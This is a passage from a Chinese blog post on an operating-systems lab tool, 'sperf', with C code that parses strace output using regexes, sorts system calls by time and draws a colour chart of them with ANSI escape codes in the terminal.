&#123;;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(leftIndex &gt;= rightIndex) &#123; <span class="keyword">break</span>; &#125;</span><br><span class="line"></span><br><span class="line">temp = base[leftIndex];</span><br><span class="line">base[leftIndex] = base[rightIndex];</span><br><span class="line">base[rightIndex] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">temp = base[left];</span><br><span class="line">base[left] = base[rightIndex];</span><br><span class="line">base[rightIndex] = temp;</span><br><span class="line"></span><br><span class="line">_syscall_info_qsort(base, left, rightIndex - <span class="number">1</span>, cmp);</span><br><span class="line">_syscall_info_qsort(base, rightIndex +<span class="number">1</span>, right, cmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">syscall_info_sort_by_name_cmp</span><span class="params">(Syscall_Info **base, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strcmp</span>(base[i]-&gt;syscall, base[j]-&gt;syscall);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">syscall_info_sort_by_time_cmp</span><span class="params">(Syscall_Info **base, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line"><span class="comment">//为了确保正确性，如果i == j，则应该返回0，否则qsort的rightIndex可能越界</span></span><br><span class="line"><span class="keyword">if</span>(base[i]-&gt;time == base[j]-&gt;time) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(base[i]-&gt;time &gt; base[j]-&gt;time) &#123; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 添加系统调用的相关信息，</span></span><br><span class="line"><span class="comment"> * 如果系统调用存在的话，直接增加其时间即可</span></span><br><span class="line"><span class="comment"> * 如果系统调用不存在的话，新创建</span></span><br><span class="line"><span class="comment"> * 插入完成后，完成相关的排序即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_info_insert_and_sort</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">long</span> <span class="type">long</span> time)</span> &#123;</span><br><span class="line"></span><br><span class="line">syscall_time_total += time;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> syscall_info_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>((syscall_info_idx = syscall_info_find_idx_by_name(name)) == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="comment">//此时系统调用信息不能存在，需要创建一个</span></span><br><span class="line">Syscall_Info *syscall_info = (Syscall_Info*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Syscall_Info));</span><br><span class="line">syscall_info-&gt;syscall = name;</span><br><span class="line">syscall_info-&gt;syscall_name_size = <span class="built_in">strlen</span>(name);</span><br><span class="line">syscall_info-&gt;time = time;</span><br><span class="line"></span><br><span class="line">syscall_info_sort_by_name[syscall_info_number] = syscall_info;</span><br><span class="line">syscall_info_sort_by_time[syscall_info_number++] = syscall_info;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">syscall_info_sort_by_name_sort();</span><br><span class="line">syscall_info_sort_by_time_sort();</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//此时系统调用信息存在，直接修改并排序即可</span></span><br><span class="line">syscall_info_sort_by_name[syscall_info_idx]-&gt;time += time;</span><br><span class="line">syscall_info_sort_by_time_sort();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  最后，则是通过正则表达式捕获<strong>strace</strong>输出中的系统调用及其时间信息。由于系统调用名称总是位于每一行的开头，且第一次遇见<strong>(</strong>结束，则通过如下的正则表达式进行捕获即可<code>^[^\\(]+</code>;而对于系统调用所消耗的时间，其位于每一行的结尾，且在小数后紧跟着<strong>&gt;</strong>，则通过如下正则表达式进行捕获即可<code>[0-9]+\\.[0-9]+&gt;$</code>。则最终解析子进程的输出的相关代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 通过正则匹配解析字符串的信息，从而获取所有的系统调用统计信息，并完成字符串和系统调用统计信息的更新</span></span><br><span class="line"><span class="comment"> * 这里由于可能字符串包含不完整的一行，则保留不完整的部分，并将其移动至行首即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">regex_t</span> regex_syscall, regex_time;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> re_syscall (<span class="string">&quot;^[^\\(]+&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> re_time (<span class="string">&quot;[0-9]+\\.[0-9]+&gt;$&quot;</span>)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">parse_strace_output_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(regcomp(&amp;regex_syscall, re_syscall, REG_EXTENDED | REG_NEWLINE)) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;regcomp(&amp;regex_syscall, re_syscall, REG_EXTENDED)\n&quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(regcomp(&amp;regex_time, re_time, REG_EXTENDED | REG_NEWLINE)) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;regcomp(&amp;regex_time, re_time, REG_EXTENDED)\n&quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 根据正则匹配时进行解析即可</span></span><br><span class="line"><span class="comment"> * 如果同时匹配到syscall和time，则完成更新后，继续下一次解析</span></span><br><span class="line"><span class="comment"> * 如果有任何一个未匹配，则从最后一次匹配的位置处，将其移动至行首,并返回剩余的字符串长度即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NS_TO_LONGLONG (1000000)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">parse_strace_output</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> buf_size)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(buf_size == <span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> time = <span class="number">0</span>;</span><br><span class="line"><span class="type">regmatch_t</span> pmatch[<span class="number">1</span>];</span><br><span class="line"><span class="type">char</span> *regex_syscall_so = buf, *regex_syscall_eo = buf, *regex_time_so = buf, *regex_time_eo = buf, regex_matched = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始进行匹配即可</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(regexec(&amp;regex_syscall, regex_time_eo, <span class="keyword">sizeof</span>(pmatch) / <span class="keyword">sizeof</span>(pmatch[<span class="number">0</span>]), pmatch, <span class="number">0</span>)) &#123; <span class="keyword">break</span>;&#125;</span><br><span class="line">regex_syscall_so = regex_time_eo + pmatch[<span class="number">0</span>].rm_so;</span><br><span class="line">regex_syscall_eo = regex_time_eo + pmatch[<span class="number">0</span>].rm_eo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(regexec(&amp;regex_time, regex_syscall_eo, <span class="keyword">sizeof</span>(pmatch) / <span class="keyword">sizeof</span>(pmatch[<span class="number">0</span>]), pmatch, <span class="number">0</span>)) &#123; <span class="keyword">break</span>;&#125;</span><br><span class="line">regex_time_so = regex_syscall_eo + pmatch[<span class="number">0</span>].rm_so;</span><br><span class="line">regex_time_eo = regex_syscall_eo + pmatch[<span class="number">0</span>].rm_eo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">regex_matched = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//截取系统调用名称</span></span><br><span class="line"><span class="type">int</span> syscall_name_size = regex_syscall_eo - regex_syscall_so;</span><br><span class="line"><span class="type">char</span> *syscall = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>) * (<span class="number">1</span> + syscall_name_size));</span><br><span class="line"><span class="built_in">memcpy</span>(syscall, regex_syscall_so, syscall_name_size);</span><br><span class="line">syscall[syscall_name_size] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//截取系统调用的消耗时间</span></span><br><span class="line"><span class="built_in">sscanf</span>(regex_time_so, <span class="string">&quot;%lf&quot;</span>, &amp;time);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加该系统调用及其消耗时间统计</span></span><br><span class="line">syscall_info_insert_and_sort(syscall, time * NS_TO_LONGLONG);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//由于更新了系统调用的统计信息，因此更新其gui图像展示</span></span><br><span class="line"><span class="keyword">if</span>(regex_matched) &#123; syscall_info_display(); &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//由于可能重叠，因此只能使用memmove，而非memcopy</span></span><br><span class="line"><span class="type">int</span> remain_size = buf + buf_size - regex_time_eo;</span><br><span class="line">memmove(buf, regex_time_eo, remain_size);</span><br><span class="line">buf[remain_size] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> remain_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="图形化展示-1"><a href="#图形化展示-1" class="headerlink" title="图形化展示"></a>图形化展示</h3><p>  有时，”面向终端编程”并不是十分的直观，并且十分枯燥。因此可以通过使用<a href="https://segmentfault.com/a/1190000023553724">ANSI Escape Code</a>，设置字符的颜色和坐标，从而通过在字符终端里绘制系统调用图的方式展示系统调用的耗时(系统调用所花时间与所占面积成正比)，直观地展示系统调用信息<br>  首先，为了美观，我们按照实验指南中的部分进行布局终端界面，如下所示<br>  <img src="图形化布局.PNG" alt="图形化布局"><br>  即top1的系统调用，其高和终端界面等高;top2的系统调用，其宽充满终端除了top1系统调用后剩余的宽;top3的系统调用，其高充满终端除了top2系统调用后剩余的高;top4的系统调用，其宽充满终端除了top1的系统调用和top3的系统调用后剩余的宽;最后top5的系统调用，其高充满终端除了top2的系统调用和top4的系统调用后剩余的高。<br>  看着可能比较麻烦，实际上就是一道小的算法题:</p><ol><li>一方面，每一次切割给系统调用展示时，其都是切割的左侧/上侧的矩形，剩余的始终是右下角的矩形。因此，我们只要一直记录剩余矩形的左上角坐标，即可轻松的记录整个剩余可分割的部分</li><li>在1.的基础上，如果通过<strong>ANSI</strong>实现了光标的相对位移的移动，则可以轻松的通过移动光标再输出，从而完成系统调用的分割和展示</li></ol><blockquote><p>Talk is cheap, Show me the code<br><strong><p align="right">----Linus Torvalds</p></strong></p></blockquote><p>  直接展示代码可能理解起来更快<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将系统调用的统计信息以图形化的形式进行展示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//根据实验指南说明，其为图像中展示的不同的系统调用的个数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_INFO_SHOW_SIZE (5)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置终端展示时候的窗口高</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_INFO_WINDOW_HEIGHT (20)</span></span><br><span class="line"><span class="comment">//设置终端展示时候的窗口高</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSCALL_INFO_WINDOW_WIDTH (40)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_info_show_format(color) (<span class="string">&quot;\e[&quot;</span>#color<span class="string">&quot;;37m%s\e[0m&quot;</span>)</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *syscall_info_show_formats[SYSCALL_INFO_SHOW_SIZE] = &#123;syscall_info_show_format(<span class="number">42</span>), syscall_info_show_format(<span class="number">45</span>), syscall_info_show_format(<span class="number">43</span>), syscall_info_show_format(<span class="number">44</span>), syscall_info_show_format(<span class="number">46</span>)&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_info_show(idx, str) (fprintf(stderr, syscall_info_show_formats[(idx)], (str)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_info_show_move(opcode) (fprintf(stderr, <span class="string">&quot;\e[1&quot;</span>#opcode))</span></span><br><span class="line"><span class="comment">//将当前光标上移n行，列数不变</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_info_show_move_up</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; ++i) &#123; syscall_info_show_move(A); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将当前光标下移n行，列数不变</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_info_show_move_down</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; ++i) &#123; syscall_info_show_move(B); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将当前光标左移n列，行数不变</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_info_show_move_left</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; ++i) &#123; syscall_info_show_move(D); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将当前光标右移n列，行数不变</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_info_show_move_right</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; ++i) &#123; syscall_info_show_move(C); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将光标默认移动到第0行，第0列</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_info_show_position_init() (fprintf(stderr, <span class="string">&quot;\e[0;0H&quot;</span>))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 由于每次切割后,记录可用的矩阵的左上坐标即可</span></span><br><span class="line"><span class="comment"> * (row, col)</span></span><br><span class="line"><span class="comment"> * (0,0)(0, width - 1)</span></span><br><span class="line"><span class="comment"> * _______________________________________</span></span><br><span class="line"><span class="comment"> * | |</span></span><br><span class="line"><span class="comment"> * | |</span></span><br><span class="line"><span class="comment"> * |_____________________________________|</span></span><br><span class="line"><span class="comment"> * (height - 1, 0)(height - 1, witdh - 1)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_info_display</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为了使gui界面完整，界面左上角始终从(0， 0)开始</span></span><br><span class="line">syscall_info_show_position_init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> left_top_row = <span class="number">0</span>, left_top_col = <span class="number">0</span>, syscall_info_idx = <span class="number">0</span>, height = <span class="number">0</span>, width = <span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> syscall_info_show_time_total = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//计算需要展示部分的总时间，方便统计每次切分窗口的大小</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; SYSCALL_INFO_SHOW_SIZE &amp;&amp; i &lt; syscall_info_number; ++i) &#123; syscall_info_show_time_total += syscall_info_sort_by_time[i]-&gt;time; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//为了避免留有空白，则最后一部分不需要进行切割，直接有多少切分多少;其余按照比例进行切割即可</span></span><br><span class="line"><span class="keyword">for</span>(; syscall_info_idx + <span class="number">1</span> &lt; SYSCALL_INFO_SHOW_SIZE &amp;&amp; syscall_info_idx + <span class="number">1</span> &lt; syscall_info_number; ++syscall_info_idx) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//此时其宽和窗口的宽等宽，高按照比例进行相关的切分</span></span><br><span class="line"><span class="keyword">if</span>(syscall_info_idx &amp; <span class="number">1</span>) &#123;</span><br><span class="line">width = SYSCALL_INFO_WINDOW_WIDTH - left_top_col;</span><br><span class="line">height = (SYSCALL_INFO_WINDOW_HEIGHT - left_top_row) * (syscall_info_sort_by_time[syscall_info_idx]-&gt;time / (<span class="type">double</span>)syscall_info_show_time_total);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//此时高和窗口的高等高，宽按照比例进行切分即可</span></span><br><span class="line">height = SYSCALL_INFO_WINDOW_HEIGHT - left_top_row;</span><br><span class="line">width = (SYSCALL_INFO_WINDOW_WIDTH - left_top_col) * (syscall_info_sort_by_time[syscall_info_idx]-&gt;time / (<span class="type">double</span>)syscall_info_show_time_total);</span><br><span class="line">&#125;</span><br><span class="line">syscall_info_show_time_total -= syscall_info_sort_by_time[syscall_info_idx]-&gt;time;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//将[left_top_row, left_top_col] -&gt; [left_top_row + height, left_top_col + width]为对角线的矩形进行上色即可</span></span><br><span class="line"><span class="type">int</span> row_end = left_top_row + height, col_end = left_top_col + width;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> row = left_top_row; row &lt; row_end; ++row) &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> col = left_top_col; col &lt; col_end; ++col) &#123; syscall_info_show(syscall_info_idx, <span class="string">&quot; &quot;</span>); &#125;</span><br><span class="line">syscall_info_show_move_down(<span class="number">1</span>);</span><br><span class="line">syscall_info_show_move_left(width);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 输出系统调用及其消耗时间占比</span></span><br><span class="line"><span class="comment"> * 名称位于第一行的最左侧</span></span><br><span class="line"><span class="comment"> * 系统调用位于下一行的最左侧</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">syscall_info_show_move_up(height);</span><br><span class="line">syscall_info_show(syscall_info_idx, syscall_info_sort_by_time[syscall_info_idx]-&gt;syscall);</span><br><span class="line"></span><br><span class="line">syscall_info_show_move_down(<span class="number">1</span>);</span><br><span class="line">syscall_info_show_move_left(syscall_info_sort_by_time[syscall_info_idx]-&gt;syscall_name_size);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> percentage[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(percentage, <span class="string">&quot;%2.0lf%%&quot;</span>, syscall_info_sort_by_time[syscall_info_idx]-&gt;time / (<span class="type">double</span>)syscall_time_total * <span class="number">100</span>);</span><br><span class="line">syscall_info_show(syscall_info_idx, percentage);</span><br><span class="line"></span><br><span class="line"><span class="comment">//下一个从左下角开始</span></span><br><span class="line"><span class="keyword">if</span>(syscall_info_idx &amp; <span class="number">1</span>) &#123;</span><br><span class="line">syscall_info_show_move_down(height - <span class="number">1</span>);<span class="comment">//即left_top_row + height - (left_top_row + 1)</span></span><br><span class="line">syscall_info_show_move_left(<span class="built_in">strlen</span>(percentage));<span class="comment">//即left_top_col + strlen(percentage) - left_top_col</span></span><br><span class="line"></span><br><span class="line">left_top_row += height;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//下一个从右上角开始</span></span><br><span class="line">syscall_info_show_move_up(<span class="number">1</span>);<span class="comment">//即left_top_row + 1 - left_top_row</span></span><br><span class="line">syscall_info_show_move_right(width - <span class="number">3</span>);<span class="comment">//即left_top_col + width - (left_top_col + strlen(percentage))</span></span><br><span class="line">left_top_col += width;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出最后一个需要展示的系统调用，这里将剩余的矩形全部分配给他即可</span></span><br><span class="line">height = SYSCALL_INFO_WINDOW_HEIGHT - left_top_row;</span><br><span class="line">width = SYSCALL_INFO_WINDOW_WIDTH - left_top_col;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> row = left_top_row; row &lt; SYSCALL_INFO_WINDOW_HEIGHT; ++row) &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> col = left_top_col; col &lt; SYSCALL_INFO_WINDOW_WIDTH; ++col) &#123;syscall_info_show(syscall_info_idx, <span class="string">&quot; &quot;</span>); &#125;</span><br><span class="line">syscall_info_show_move_down(<span class="number">1</span>);</span><br><span class="line">syscall_info_show_move_left(width);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 输出系统调用及其消耗时间占比</span></span><br><span class="line"><span class="comment"> * 名称位于第一行的最左侧</span></span><br><span class="line"><span class="comment"> * 系统调用位于下一行的最左侧</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">syscall_info_show_move_up(height);</span><br><span class="line"></span><br><span class="line">syscall_info_show(syscall_info_idx, syscall_info_sort_by_time[syscall_info_idx]-&gt;syscall);</span><br><span class="line">syscall_info_show_move_down(<span class="number">1</span>);</span><br><span class="line">syscall_info_show_move_left(syscall_info_sort_by_time[syscall_info_idx]-&gt;syscall_name_size);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> percentage[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(percentage, <span class="string">&quot;%2.0lf%%&quot;</span>, syscall_info_sort_by_time[syscall_info_idx]-&gt;time / (<span class="type">double</span>)syscall_time_total * <span class="number">100</span>);</span><br><span class="line">syscall_info_show(syscall_info_idx, percentage);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//为了位置gui界面的完整，这里将光标设置到gui界面的下一行行首开始输出</span></span><br><span class="line">syscall_info_show_move_down(SYSCALL_INFO_WINDOW_HEIGHT - left_top_row - <span class="number">1</span>);<span class="comment">//即SYSCALL_INFO_WINDOW_HEIGHT - (left_top_row + 1)</span></span><br><span class="line">syscall_info_show_move_left(left_top_col + <span class="built_in">strlen</span>(percentage));<span class="comment">//即left_top_col + strlen(percentage) - 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//实验指南中，为了区分不同时刻的输出，添加的分界符号</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">80</span>; ++i) &#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%c&quot;</span>, <span class="string">&#x27;\x00&#x27;</span>); &#125;</span><br><span class="line">fflush(<span class="built_in">stderr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>  这里直接执行实验指南中测试的命令，即<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sperf-64 python -c <span class="string">&#x27;2**1000000&#x27;</span> &gt; /dev/null</span><br></pre></td></tr></table></figure></p><p>  实验结果如下图所示<br>  <img src="实验结果.PNG" alt="实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcache中的double free</title>
